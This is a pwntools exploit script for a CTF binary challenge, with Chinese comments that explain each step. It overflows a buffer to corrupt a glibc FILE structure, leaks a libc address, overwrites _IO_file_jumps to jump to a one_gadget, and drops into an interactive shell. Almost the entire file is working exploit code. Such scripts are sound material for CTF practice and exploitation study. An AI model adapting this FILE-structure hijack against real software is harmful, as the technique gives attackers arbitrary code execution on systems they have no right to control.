from pwn import *

context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'

# remote 目前過不了
r = process("./chal")
# r = remote("edu-ctf.zoolab.org",30218)

l = ELF('../libc.so.6')


r.sendlineafter(">","1")
r.sendlineafter(">","2")


# 先把fileno 寫成stdout,讓我們可以把libc寫出來
payload = flat(
    0,0,
    0,0,
    0,0,
    0,0,
    0,0,
    0,0,
    0,0,
    1
)

r.sendlineafter("data>",b"A"*0x210+payload)
# 因為目前fp 的FILE上面沒有buffer,先fwrite一次讓sys 幫我們allocate 一些 buffer,因為我們沒有heap
# 的address也不行自己寫入buffer address
r.sendlineafter(">","3")
r.sendlineafter(">","2")

# 利用gets會把最後一個byte會自動被放成\x00,所以這樣寫的話 , 可以讓write_buf_base的LSB變成\x00
# 也就是說可以多輸出原本buffer指向的位置前面的位置,所以如果上面有其他地方有libc的address ,我們就
# 會得到libc的address
# (像是File struct 本身的就有vtable的pointer會指向libc)
file_flags = p64(0xfbad1800)
payload = flat(
    file_flags,0,
    0,0
)

r.sendlineafter("data>",b"A"*0x210+payload)
# gdb.attach(r)
r.sendlineafter(">","3")
libc = r.recvuntil('-----')
print("libc",libc)
libc = libc[libc.find(b'A'*8)-0x10:libc.find(b'A'*8)-0x8]
libc = u64(libc) - 0x1ecf60
# print("libc",len(libc))
print("libc",hex(libc))

# one_gadget =  libc + 0xe6c81
# r.sendlineafter(">","4")
# r.sendline(p64(one_gadget))

# gdb.attach(r)

# stdin_file_address = libc + 0x1eb980


l = ELF('../libc.so.6')

_IO_file_jumps= libc + l.sym['_IO_file_jumps']

print("_IO_file_jumps",hex(_IO_file_jumps))



file_flag = 0x0800

# 因為是fwrite,所以我們想要改掉_IO_file_overflow上面的值
# 想法：把fwrite的write_buffer_base 改成 _IO_file_overflow的起始位置,
# write_buffer_ptr也是起始位置, 因為要讓它從這邊開始填字
# write
payload = flat(
    file_flag,0,
    _IO_file_jumps+0x18,0,
    _IO_file_jumps+0x18,_IO_file_jumps+0x18,
    _IO_file_jumps+0x20,0,
    0,0,
    0,0,
    0,0,
    1
)
gdb.attach(r)

r.sendlineafter(">","2")
# 這邊payload 送 \x00 是因為one gadget 要求的參數剛好這邊要0
r.sendlineafter("data>",b"\x00"*0x210+payload)

# one_gadget =  libc + 0xe6c81
one_gadget =  libc + 0xe6c7e

r.sendlineafter(">","2")
# r.sendlineafter("data>",p64(one_gadget))
r.sendlineafter("data>",p64(one_gadget)[:-1])
r.sendlineafter(">","3")




r.interactive()

